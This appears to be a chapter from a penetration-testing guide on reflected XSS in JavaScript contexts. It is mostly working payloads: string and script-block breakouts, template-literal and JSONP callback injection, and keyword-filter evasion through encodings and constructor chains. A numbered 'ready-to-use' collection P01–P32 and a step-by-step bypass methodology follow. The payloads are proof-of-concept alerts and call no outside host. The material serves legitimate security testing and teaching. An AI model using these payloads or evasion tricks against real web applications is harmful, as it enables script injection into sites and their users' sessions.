# 04 - Reflected XSS: JavaScript Context Injection

## Overview

When user input is reflected inside an existing JavaScript block -- within a string literal, template literal, JSON structure, or inline script -- the attacker must break out of the current syntactic context to inject executable code. This is fundamentally different from HTML context injection because the parser is already in JavaScript mode; the goal is to terminate the current expression and introduce new statements or expressions.

**Key Principle**: Identify the exact syntactic position of the reflection (string delimiter, template literal, JSON key/value, JSONP callback, script src attribute) before selecting a breakout strategy.

**Sources**:
- [PortSwigger - Cross-site Scripting Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Northover - XSS Breaking Out](https://www.northover.co/articles/xss-breaking-out)
- [Securitum - Unicode's Role in XSS](https://www.securitum.com/unicodes_role_in_xss_vulnerabilities.html)

---

## 1. Breaking Out of JavaScript String Literals

### 1.1 Delimiter Escape (Single-Quote and Double-Quote Strings)

When input is reflected inside a quoted JavaScript string:

```javascript
// Vulnerable code pattern:
var name = 'REFLECTED';
var name = "REFLECTED";
```

**Basic breakout -- terminate string and inject new statement:**

```javascript
// Single-quote context
'-alert(1)-'
';alert(1)//
';alert(1);var a='
'+alert(1)+'
'*alert(1)*'
'in alert(1)//

// Double-quote context
"-alert(1)-"
";alert(1)//
";alert(1);var a="
"+alert(1)+"
```

**Closing the script block entirely (most reliable when quotes are escaped):**

```html
</script><script>alert(1)</script>
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

### 1.2 Backslash Bypass

When the application escapes quotes by adding a backslash (`'` becomes `\'`), but does NOT escape the backslash itself:

```javascript
// Vulnerable: App turns ' into \' but doesn't escape \
// Inject: \';alert(1)//
// Becomes: var name = '\\';alert(1)//';
// The injected \ escapes the app's \, leaving ' unescaped

\';alert(1)//
\";alert(1)//
\'-alert(1)-\'
```

**How it works**: The application adds `\` before `'`, producing `\\'`. The first `\` (attacker's) escapes the second `\` (application's), so the `'` is now unescaped and terminates the string.

### 1.3 Unicode Escape Sequences

JavaScript allows Unicode escapes in identifiers and string content:

```javascript
// Unicode escape in identifier names
\u0061lert(1)           // equivalent to alert(1)
al\u0065rt(1)           // equivalent to alert(1)
\u0061\u006c\u0065\u0072\u0074(1)  // full unicode alert

// Hex escapes inside strings
'\x3c\x73\x63\x72\x69\x70\x74\x3e'  // <script> in hex
'\x61\x6c\x65\x72\x74\x28\x31\x29'  // alert(1) in hex

// Octal escapes (legacy, still works)
'\141\154\145\162\164\050\061\051'   // alert(1) in octal

// Unicode code point escapes (ES6)
\u{61}lert(1)           // equivalent to alert(1)
```

### 1.4 Line Terminator Injection (U+2028, U+2029)

JavaScript (pre-ES2019) treats U+2028 (Line Separator) and U+2029 (Paragraph Separator) as line terminators. These characters terminate a string literal even though they are NOT newlines in HTML:

```javascript
// Vulnerable code: var x = 'REFLECTED';
// If U+2028 or U+2029 pass through server-side filters:

// Inject (raw bytes): <value>U+2028alert(1)//
// Result: var x = '
// alert(1)//';
// The U+2028 terminates the string, causing a syntax error that
// can be leveraged with careful payload construction

// Practical payload:
// [U+2028];alert(1)//
```

**Important Note**: ES2019 (and later) made U+2028 and U+2029 valid inside string literals, so this attack only works against runtimes or transpilers targeting pre-ES2019 behavior. However, JSON.parse() in older environments also treats these differently.

Source: [Securitum - Unicode's Role in XSS](https://www.securitum.com/unicodes_role_in_xss_vulnerabilities.html)

### 1.5 HTML Entity Decoding in Event Handlers

When the JavaScript context is inside an HTML attribute (like an event handler), HTML entities are decoded BEFORE JavaScript execution:

```html
<!-- The browser HTML-decodes the attribute value first, then executes JS -->
<div onclick="var x='&apos;-alert(1)-&apos;'">click</div>

<!-- This means HTML-encoded quotes work for breakout: -->
<div onclick="var x='&#39;-alert(1)-&#39;'">click</div>
<div onclick="var x='&#x27;-alert(1)-&#x27;'">click</div>

<!-- HTML-encoded angle brackets for script injection: -->
<div onclick="x='&lt;img src=x onerror=alert(1)&gt;'">click</div>
```

**Key insight**: If the application escapes quotes for JavaScript but not HTML entities, the HTML entity `&#39;` will be decoded to `'` by the HTML parser before JavaScript sees it.

Source: [PortSwigger - XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)

---

## 2. Breaking Out of Script Blocks

### 2.1 </script> Tag Injection

The HTML parser takes precedence over JavaScript. If `</script>` appears in the source, it closes the script block regardless of JavaScript string context:

```javascript
// Vulnerable: var search = 'REFLECTED';
// Payload:
</script><script>alert(1)</script>
</script><img src=x onerror=alert(1)>
</script><svg/onload=alert(1)>
```

**This works even inside JS strings** because the HTML parser closes the `<script>` tag before the JS parser processes the string content.

### 2.2 Partial Tag Closure Tricks

```html
<!-- Lowercase/uppercase variation -->
</Script><script>alert(1)</script>
</SCRIPT><script>alert(1)</script>

<!-- Space before closing angle bracket -->
</script ><script>alert(1)</script>

<!-- Null byte injection (legacy browsers) -->
</scri%00pt><script>alert(1)</script>

<!-- Using HTML comment inside script -->
<!-- In some parsers: -->
<script>var x='INJECT';</script><!--<script>alert(1)//--></script>
```

### 2.3 Newline/Comment Techniques

When the reflection is on a single line and the application appends closing code:

```javascript
// Vulnerable: var x = 'REFLECTED'; doSomething(x);

// Use single-line comment to discard rest of line
';alert(1)//

// Use multi-line comment to discard rest
';alert(1)/*

// Use newline to break into next statement
';
alert(1);
var b='
```

---

## 3. JavaScript Expression Injection

When input is reflected inside a JavaScript expression rather than a string.

### 3.1 Arithmetic Context

```javascript
// Vulnerable: var result = REFLECTED + 10;
alert(1)//+10
alert(1)-//

// Vulnerable: var result = calc(REFLECTED);
alert(1))//
1);alert(1)//
```

### 3.2 Conditional/Ternary Context

```javascript
// Vulnerable: var x = REFLECTED ? true : false;
alert(1)//? true : false
1;alert(1)//
```

### 3.3 Object Key Context

```javascript
// Vulnerable: var obj = { key: 'REFLECTED' };

// Break out of value
'-alert(1)-'
'};alert(1);var a={a:'

// Break out of entire object
'};alert(1);//
```

### 3.4 Array Context

```javascript
// Vulnerable: var arr = ['REFLECTED'];
'];alert(1);//
'-alert(1)-'
```

### 3.5 Function Argument Context

```javascript
// Vulnerable: someFunc('REFLECTED');
');alert(1);//
'-alert(1)-'
',alert(1),'
```

### 3.6 Template Literal Injection (ES6+)

When input is reflected inside a JavaScript template literal (backtick-delimited string):

```javascript
// Vulnerable: var msg = `Hello REFLECTED`;

// Template literals support ${expression} for inline JS execution
${alert(1)}
${alert(document.domain)}
${7*7}                    // numeric test first
${self['alert'](1)}
${constructor.constructor('alert(1)')()}
${[1].map(alert)}

// No need to break out of the literal at all!
// The ${} syntax evaluates the expression inline
```

**This is one of the most powerful JS context injections** because:
1. No need to close the string
2. No need to escape quotes
3. Directly executes arbitrary expressions

Source: [PortSwigger Lab - Template Literal XSS](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped), [Medium - Exploiting Template Strings](https://medium.com/@spainpromise/exploiting-template-strings-with-xss-8c8c43c04ba7)

---

## 4. JSON Context Exploitation

### 4.1 Breaking Out of JSON Strings

When input is embedded in inline JSON within a script block:

```html
<!-- Vulnerable pattern: -->
<script>
  var config = {"name": "REFLECTED", "role": "user"};
</script>

<!-- Payload: break out of JSON string -->
"};alert(1);//
"-alert(1)-"
","role":"admin"}; alert(1);//
```

### 4.2 JSON.parse vs Inline JSON

**Inline JSON** (directly in a `<script>` tag) is parsed by the JavaScript engine and is vulnerable to `</script>` injection:

```html
<script>
  var data = {"search": "</script><script>alert(1)</script>"};
</script>
```

**JSON.parse()** with a string argument is safer because the JSON string is parsed by JSON.parse, not the JS engine directly. However, if the JSON string is built by concatenation, breakout is still possible:

```javascript
// Vulnerable:
var data = JSON.parse('{"name":"REFLECTED"}');

// Payload:
"};alert(1);//    // won't work -- JSON.parse will throw
// But if script block closure works:
"}');alert(1);//
```

### 4.3 JSONP Callback Injection

JSONP endpoints wrap JSON data in a callback function. If the callback parameter is unsanitized:

```
// Normal JSONP response:
GET /api/data?callback=myFunc
Response: myFunc({"data": "value"})

// Malicious callback injection:
GET /api/data?callback=alert(1)//
Response: alert(1)//({"data": "value"})

// More complex payloads:
GET /api/data?callback=alert(1);foo
Response: alert(1);foo({"data": "value"})

// HTML injection via callback:
GET /api/data?callback=<script>alert(1)</script>
Response: <script>alert(1)</script>({"data": "value"})

// Constructor technique:
GET /api/data?callback=Function.prototype.call.call(alert,null,1)//
```

**JSONP callback validation bypass techniques:**

```
// If alphanumeric-only filter with dots allowed:
callback=window.alert
callback=self.alert
callback=top.alert
callback=parent.alert

// If content-type is text/javascript or application/javascript:
// The callback is executed directly -- any valid JS expression works

// Angular/jQuery specific:
callback=angular.callbacks._0
callback=jQuery111006498498498_1111111111
```

**Real-world example** (CVE in SRS media server):
```
// Endpoint: /api/v1/vhosts/vid-<id>?callback=<payload>
// The callback name was returned verbatim, allowing:
GET /api/v1/vhosts/vid-1?callback=confirm(document.domain)%2f%2f
```

Source: [HackerOne Report #259100](https://hackerone.com/reports/259100), [Security Cafe - Practical JSONP Injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/), [SRS JSONP XSS Advisory](https://github.com/ossrs/srs/security/advisories/GHSA-gv9r-qcjc-5hj7)

### 4.4 Content-Type Confusion

When a JSONP endpoint returns `Content-Type: application/json` but is loaded via `<script src="...">`, the browser executes it as JavaScript regardless of the Content-Type header. This is because `<script>` tags ignore MIME types.

```html
<!-- Loading JSONP endpoint as script -->
<script src="https://target.com/api?callback=alert(1)//">
</script>

<!-- If X-Content-Type-Options: nosniff is NOT set, -->
<!-- even non-script content types may execute -->
```

**Defense check**: Look for `X-Content-Type-Options: nosniff` header and proper CORS configuration.

---

## 5. JavaScript-Specific Encoding Tricks

### 5.1 String.fromCharCode Bypass

```javascript
// Bypass keyword filters by constructing strings from char codes
String.fromCharCode(97,108,101,114,116)  // "alert"

// Execute dynamically:
window[String.fromCharCode(97,108,101,114,116)](1)

// Or with Function constructor:
new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()
```

### 5.2 Base64 / atob Bypass

```javascript
// Encode payload in base64
atob('YWxlcnQoMSk=')  // decodes to "alert(1)"

// Execute:
window[atob('YWxlcnQ=')](1)
Function(atob('YWxlcnQoMSk='))()
```

### 5.3 Concatenation and Indirect Access

```javascript
// String concatenation to bypass keyword filters
window['al'+'ert'](1)
window['ale'+'rt'](1)
self['al'+'ert'](1)
top['al'+'ert'](1)
this['al'+'ert'](1)
globalThis['al'+'ert'](1)

// Bracket notation for property access
window['alert'](1)
frames['alert'](1)
```

### 5.4 Constructor Chain

```javascript
// Access Function constructor to create and execute arbitrary code
[].constructor.constructor('alert(1)')()
''.constructor.constructor('alert(1)')()
/x/.constructor.constructor('alert(1)')()
(0).constructor.constructor('alert(1)')()
true.constructor.constructor('alert(1)')()

// Using Proxy/Reflect (modern browsers)
Reflect.apply(alert, null, [1])
```

### 5.5 Tagged Template Literals

```javascript
// Tagged template literal -- function called with template string
alert`1`
confirm`1`
prompt`1`

// With constructor chain:
[].constructor.constructor`alert\x28\x31\x29```

// ECMAScript 6 set constructor:
Set.constructor`alert\x28document.domain\x29```
```

### 5.6 Arithmetic and Bitwise Abuse

```javascript
// Using throw with onerror
onerror=alert;throw 1
window.onerror=alert;throw 1

// Using comma operator
1,alert(1)
void(alert(1))

// Using logical operators
true&&alert(1)
false||alert(1)
null??alert(1)

// Using assignment
x=alert,x(1)
{a]alert(1)}
```

### 5.7 No-Parentheses Execution

When parentheses `()` are filtered:

```javascript
// Template literal (no parens needed)
alert`1`

// onerror + throw
onerror=alert;throw 1

// toString/valueOf override
x={toString:alert};x+''

// import() for module loading (async)
import('data:text/javascript,alert(1)')

// location assignment
location='javascript:alert(1)'
```

---

## 6. Ready-to-Use Payload Collection (JavaScript Context)

### Payload Set 1: String Breakout (Single-Quote)

```javascript
P01: '-alert(1)-'
P02: ';alert(1)//
P03: ';alert(1);var a='
P04: '+alert(1)+'
P05: '\';alert(1)//            // backslash bypass
P06: </script><img src=x onerror=alert(1)>
```

### Payload Set 2: String Breakout (Double-Quote)

```javascript
P07: "-alert(1)-"
P08: ";alert(1)//
P09: ";alert(1);var a="
P10: "+alert(1)+"
P11: \";alert(1)//             // backslash bypass
P12: </script><svg onload=alert(1)>
```

### Payload Set 3: Template Literal Injection

```javascript
P13: ${alert(1)}
P14: ${alert(document.domain)}
P15: ${self['alert'](1)}
P16: ${constructor.constructor('alert(1)')()}
P17: ${[1].map(alert)}
```

### Payload Set 4: JSONP Callback

```
P18: callback=alert(1)//
P19: callback=alert(1);foo
P20: callback=window.alert
P21: callback=self['alert']
P22: callback=Function.prototype.call.call(alert,null,1)//
```

### Payload Set 5: Encoding Bypass

```javascript
P23: \u0061lert(1)
P24: window['al'+'ert'](1)
P25: window[atob('YWxlcnQ=')](1)
P26: [].constructor.constructor('alert(1)')()
P27: Set.constructor`alert\x28document.domain\x29```
P28: window[String.fromCharCode(97,108,101,114,116)](1)
```

### Payload Set 6: No-Parentheses

```javascript
P29: onerror=alert;throw 1
P30: alert`1`
P31: location='javascript:alert(1)'
P32: import('data:text/javascript,alert(1)')
```

---

## 7. Vulnerable Code Patterns and Exploitation

### Pattern 1: Inline Search Term

```html
<!-- Vulnerable -->
<script>var search = 'USER_INPUT';</script>

<!-- Exploit -->
<script>var search = '';alert(1);//';</script>
<script>var search = '</script><img src=x onerror=alert(1)>';</script>
```

### Pattern 2: User Data in JSON Config

```html
<!-- Vulnerable -->
<script>
  var config = {
    "username": "USER_INPUT",
    "theme": "dark"
  };
</script>

<!-- Exploit -->
username = ";alert(1);//
username = </script><script>alert(1)</script>
```

### Pattern 3: Event Handler with JS String

```html
<!-- Vulnerable -->
<div onclick="track('USER_INPUT')">Click</div>

<!-- Exploit (HTML entities decoded before JS execution) -->
<div onclick="track('&#39;);alert(1);//')">Click</div>
<div onclick="track('&apos;);alert(1);//')">Click</div>
```

### Pattern 4: Dynamic Script Construction

```html
<!-- Vulnerable -->
<script>
  var url = "/api/data?q=" + "USER_INPUT";
  loadData(url);
</script>

<!-- Exploit -->
USER_INPUT = ";alert(1);//
USER_INPUT = "+alert(1)+"
```

### Pattern 5: Template Literal in Modern Frameworks

```html
<!-- Vulnerable -->
<script>
  var greeting = `Welcome, USER_INPUT!`;
</script>

<!-- Exploit -->
USER_INPUT = ${alert(document.domain)}
```

---

## 8. Testing Methodology for JavaScript Context

### Step 1: Identify the JS Context
Inject `TEST'"\`${{7*7}}` and observe:
- Does the page break (JS error in console)?
- Which characters cause errors vs pass through?
- Is the reflection in a string ('/"/ `` `)? Object? Array? Function arg?

### Step 2: Determine Escaping Behavior
- Does `'` become `\'`? Check if `\` itself is escaped (inject `\`)
- Does `"` become `\"`? Same backslash check
- Does `<` become `&lt;`? (HTML encoding in JS context)
- Does `</script>` get blocked or encoded?

### Step 3: Select Breakout Strategy
- **Quotes escaped, backslash not escaped** --> Use `\` prefix bypass
- **Quotes escaped, `</script>` allowed** --> Break out of script block entirely
- **Template literal context** --> Use `${...}` injection
- **Event handler context** --> Use HTML entity encoding for JS delimiters
- **JSONP callback** --> Inject directly into callback parameter

### Step 4: Verify Execution
- Check browser console for JS errors
- Use `alert(document.domain)` for clear proof
- If alert is blocked, use alternatives from Section 5

### Step 5: Bypass Filters
- Use encoding tricks from Section 5
- Try constructor chains if keywords are filtered
- Use no-parentheses payloads if `()` is stripped
- Use template literal tagged functions if backticks are available
